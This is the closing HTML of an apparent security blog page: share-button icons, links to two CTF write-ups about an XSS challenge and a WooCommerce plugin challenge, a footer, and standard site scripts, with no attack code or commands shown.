4.7733766 7.2852273 6.4719156.1707792.0741883.7349026.3064935.7675325.3064935.0363636.0.0970779-.0607143.1415584-.111526.3405844-.3849026 1.4428572-1.6733766 1.8069806-2.2146104.3220779-.4818182.7355519-.7271104 1.2277597-.7271104.3012987.0.5845779.0926948.849026.1876624.6030564.2170398 3.8043369 1.7879312 4.3216328 2.0413055l.0686269.0335321c.4774351.2292208.8545455.4102273 1.0733766.7699676.3194805.5290584.1928572 1.9868506-.2873376 3.3211038-.609578 1.6939936-3.2894481 3.0826299-4.5089286 3.1907468l-.1788961.0170455c-.2819805.0277597-.6016234.0590909-1.000974.0590909l-.0944191-5452e-7c-.9658464-.0112678-2.6415309-.2079278-6.0576913-1.5725068-3.6667208-1.4647727-7.2837663-4.6050325-10.1852273-8.8423701-.0501623-.0733766-.0847403-.124513-.1035714-.1496753-.7576299-.998539-2.5222403-3.624026-2.5222403-6.4047078.0-3.0896104 1.4788961-4.8464286 2.3530844-5.397565.8243507-.5196428 2.6887987-.7650974 3.0311689-.7795454.0351461-.0014814.0648513-.0027775.0900577-.0039117l.1047884-.0050457c.0548951-.0028933.0444193-.0028933.0863227-.0028933z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="/cdn-cgi/l/email-protection#86b9f5f3e4ece3e5f2bbd3e8e7f3f2eee3e8f2efe5e7f2e3e2a3b4b6d4c5c3a3b4b6efe8a3b4b6c7e8f2efabcbe7eaf1e7f4e3a3b4b6d5e3e5f3f4eff2ffa3b4b6e7e8e2a3b4b6c4f4f3f2e3abc0e9f4e5e3a3b4b6c0eff4e3f1e7eaeaa3b4b6c1c9d2cbcad5a3b4b6d1e9f4e2d6f4e3f5f5a3b4b6d6eaf3e1efe8a3b4b6c5d0c3abb4b6b4b2abb4b4b7b2b2a0e4e9e2ffbbd3e8e7f3f2eee3e8f2efe5e7f2e3e2a3b4b6d4c5c3a3b4b6efe8a3b4b6c7e8f2efabcbe7eaf1e7f4e3a3b4b6d5e3e5f3f4eff2ffa3b4b6e7e8e2a3b4b6c4f4f3f2e3abc0e9f4e5e3a3b4b6c0eff4e3f1e7eaeaa3b4b6c1c9d2cbcad5a3b4b6d1e9f4e2d6f4e3f5f5a3b4b6d6eaf3e1efe8a3b4b6c5d0c3abb4b6b4b2abb4b4b7b2b2a3b6e7a3b6e7d3e8e7f3f2eee3e8f2efe5e7f2e3e2a3b4b6d4e3ebe9f2e3a3b4b6c5e9e2e3a3b4b6c3fee3e5f3f2efe9e8a3b4b6a3b4bed4c5c3a3b4bfa3b4b6e4ffa3b4b6e5eee7efe8efe8e1a3b4b6ebf3eaf2eff6eae3a3b4b6f0f3eae8e3f4e7e4efeaeff2efe3f5a3b4b6efe8a3b4b6f2eee3a3b4b6c7e8f2efabcbe7eaf1e7f4e3a3b4b6d5e3e5f3f4eff2ffa3b4b6e7e8e2a3b4b6c4f4f3f2e3abc0e9f4e5e3a3b4b6c0eff4e3f1e7eaeaa3b4b6c1c9d2cbcad5a3b4b6d1e9f4e2d6f4e3f5f5a3b4b6d6eaf3e1efe8a3b6e7a3b6e7a3b4e0e5f0e3abb4b6b4b2abb4b4b7b2b2a3b4e0a3b6e7" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m46.149789 6H3.85021097c-2.12025316.0-3.85021097 1.72995781-3.85021097 3.85021097V39.6392405c0 2.1202532 1.72995781 3.850211 3.85021097 3.850211H46.149789c2.1202532.0 3.850211-1.7299578 3.850211-3.850211V9.85021097C50 7.72995781 48.2700422 6 46.149789 6zm-.5590717 2.84810127L25.2637131 26.2320675 4.93670886 8.84810127zm1.5611814 30.79113923c0 .5485232-.4535865 1.0021097-1.0021097 1.0021097h-42.29957803c-.54852321.0-1.0021097-.4535865-1.0021097-1.0021097V10.8101266L24.335443 29.185654c.0105486.0105485.0316456.0210971.0421941.0316456.0105486.0105485.0316456.021097.0421941.0316455.0316456.0210971.0527426.0421941.0843882.0527427.0105485.0105485.0210971.0105485.0316456.021097.0421941.0210971.0843882.0421941.1265823.0632911.0105485.0.021097.0105486.0316455.0105486.0316456.0105485.0632912.0316455.1054853.0421941.0105485.0.0316455.0105485.0421941.0105485.0316455.0105485.0632911.021097.0949367.021097.0105485.0.0316455.0105486.0421941.0105486.0316455.0105485.0738396.0105485.1054852.021097h.0316456c.042194.0.0949367.0105485.1371308.0105485.042194.0.0949367.0.1371308-.0105485h.0316455c.0316456.0.0738397-.0105485.1054853-.021097.0105485.0.0316455-.0105486.0421941-.0105486.0316455-.0105485.0632911-.021097.0949367-.021097.0105485.0.0316455-.0105485.0421941-.0105485.0316455-.0105486.0632911-.0210971.1054852-.0421941.0105485.0.021097-.0105486.0316456-.0105486.042194-.021097.0843881-.042194.1265822-.0632911.0105486-.0105485.0210971-.0105485.0316456-.021097.0316456-.0210971.0527426-.0316456.0843882-.0527427.0105485-.0105485.0316456-.021097.0421941-.0316455s.0316456-.0210971.0421941-.0316456l20.9810126-17.9219409z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li></ul></nav><style>.sharebuttons,.sharebuttons ul{display:flex;margin:.25rem 0;align-items:center}.sharebuttons span{color:#bbb}.sharebuttons ul{padding-left:0!important}.sharebuttons ul li{list-style:none;margin:0}.sharebuttons ul li a{margin:0 .5rem;display:block}.sharebuttons ul li:first-child a{margin:0 .2rem 0 .5rem}.sharebuttons ul li a svg{width:auto;height:1.1rem;display:block}.will-change{transition:250ms}nav.sharebuttons li>a:hover .will-change{fill:#444}</style></section></article></main><aside class=read-more-wrap><div class="read-more inner"><article class=read-next-card><div class=read-next-card-content></ul></div></article><article class=post-card><a class=post-card-image-link href=/intigriti-february-ctf-challenge-love-letter-storage/><img class=post-card-image src=/content/images/2024/02/favourite-triager--1-.png alt="Intigriti February CTF Challenge: Love Letter Storage"></a><div class=post-card-content><a class=post-card-content-link href=/intigriti-february-ctf-challenge-love-letter-storage/><header class=post-card-header><div class=post-card-primary-tag>CTF</div><h2 class=post-card-title>Intigriti February CTF Challenge: Love Letter Storage</h2></header><div class=post-card-excerpt><p>tl;dr: Solved an awesome Valentine&rsquo;s Day challenge by @goatsniff from Intigriti. I gained valuable insights into using character conversions to bypass XSS protections and learned about data exfiltration through the manipulation of cookie paths.</p></div></a><footer class=post-card-meta><ul class=author-list><li class=author-list-item><a href=/authors/stealthcopter class=static-avatar><img class=author-profile-image src=/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png alt=stealthcopter></a></li></ul><div class=post-card-byline-content><span class=post-card-byline-author><a href=/authors/stealthcopter>stealthcopter
</a></span><span class=post-card-byline-date><time datetime=2024-122-02>22 February 2024</time>
<span class=bull>&bull;</span> 14 min read</span></div></footer></div></article><article class=post-card><a class=post-card-image-link href=/nahamcon-ctf-2024-my-shop-disaster/><img class=post-card-image src=/content/images/2024/05/_3d5a8f27-e437-4a12-8c45-fab8712a42a8.jpeg alt="NahamCon CTF 2024: My Shop Disaster"></a><div class=post-card-content><a class=post-card-content-link href=/nahamcon-ctf-2024-my-shop-disaster/><header class=post-card-header><div class=post-card-primary-tag>CTF</div><h2 class=post-card-title>NahamCon CTF 2024: My Shop Disaster</h2></header><div class=post-card-excerpt><p>Solution for the WooCommerce WordPress plugin challenge that PatchStack submitted to the NahamCon 2024 CTF.</p></div></a><footer class=post-card-meta><ul class=author-list><li class=author-list-item><a href=/authors/stealthcopter class=static-avatar><img class=author-profile-image src=/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png alt=stealthcopter></a></li></ul><div class=post-card-byline-content><span class=post-card-byline-author><a href=/authors/stealthcopter>stealthcopter
</a></span><span class=post-card-byline-date><time datetime=2024-125-05>27 May 2024</time>
<span class=bull>&bull;</span> 7 min read</span></div></footer></div></article></div></aside></div><footer class="site-footer outer"><div class=inner><section class=copyright><a href=/>stealthcopter</a> &copy; 2024</section><nav class=site-footer-nav><ul class=nav><a href=/>Latest Posts</a></ul></nav><div><a href=/about>About</a></div></footer></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src=https://code.jquery.com/jquery-3.5.1.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script><script src=/built/casper.js></script><script>$(document).ready(function(){$(".gh-burger").click(function(){$("body").toggleClass("gh-head-open")}),$(".gh-content").fitVids()})</script><script type=text/javascript src=/js/lightbox.js></script><link rel=stylesheet href=/css/lightbox.css><noscript><img src=https://analytics.stealthcopter.com/ingress/a7d59cbc-f84e-45b7-974f-aec87e055248/pixel.gif></noscript><script defer src="https://analytics.stealthcopter.com/ingress/a7d59cbc-f84e-45b7-974f-aec87e055248/script.js?v=3"></script></body></html>